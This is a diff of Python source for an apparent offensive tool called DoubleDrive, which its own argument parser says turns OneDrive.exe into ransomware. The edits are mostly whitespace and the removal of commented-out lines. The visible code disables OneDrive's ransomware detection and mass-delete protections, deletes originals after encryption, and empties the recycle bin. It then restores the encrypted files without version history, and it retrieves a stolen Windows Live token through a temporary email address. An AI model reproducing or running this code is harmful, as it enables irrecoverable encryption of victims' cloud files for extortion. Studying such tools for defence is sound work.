@@ -37,10 +37,12 @@ def restore_encrypted_files_without_version_history(onedrive_session: OneDriveSe
         print(f"Restoring encrypted file without version history: {file_path}")
         onedrive_session.create_file(f"{file_path}.encrypted", encrypted_content)
     
+
 def save_token_in_cache(drive_id, token):
     with open(f"{drive_id}.cache", "w") as f:
         return f.write(token)
     
+
 def get_token_from_temp_email():
     temp_email = TempEmail(options.TOKEN_DST_EMAIL_ADDRESS)
     messages = temp_email.get_messages()
@@ -59,6 +61,7 @@ def get_token_from_temp_email():
     windows_live_token = onedrive_session.read_shared_file_content(onedrive_file_drive_id, onedrive_file_id, onedrive_file_auth_key).decode()
     return windows_live_token
 
+
 def get_args_selected_token(args, onedrive_session):
     token = ""
     if args.use_saved_token:
@@ -70,6 +73,7 @@ def get_args_selected_token(args, onedrive_session):
         save_token_in_cache(onedrive_session.get_drive_id(), token)
 
     return token
+
 
 def remote_ransomware(onedrive_session: OneDriveSession):
     print("Disabling RansomwareDetection and MassDelete features in the target's OneDrive account")
@@ -90,14 +94,6 @@ def remote_ransomware(onedrive_session: OneDriveSession):
         print("Waiting for the files to update in the target endpoint...")
         time.sleep(10)
 
-
-    # print("Disabling target endpoint from syncing with OneDrive")
-    # onedrive_session.cancel_all_onedrive_changes_subscriptions()
-
-    # # Wait enough time for the files to update in the target endpoint
-    # print("Waiting for devices to stop syncing...")
-    # time.sleep(10)
-
     print("Deleting all encrypted files from OneDrive")
     for item in all_onedrive_files_to_encrypt:
         onedrive_session.delete_onedrive_item(item)
@@ -109,6 +105,7 @@ def remote_ransomware(onedrive_session: OneDriveSession):
     onedrive_session.empty_recycle_bin()
 
     restore_encrypted_files_without_version_history(onedrive_session, paths_to_encrypted_contents)
+
 
 def parse_args():
     parser = argparse.ArgumentParser(description="DoubleDrive - Turns the original OneDrive.exe into a ransomware")
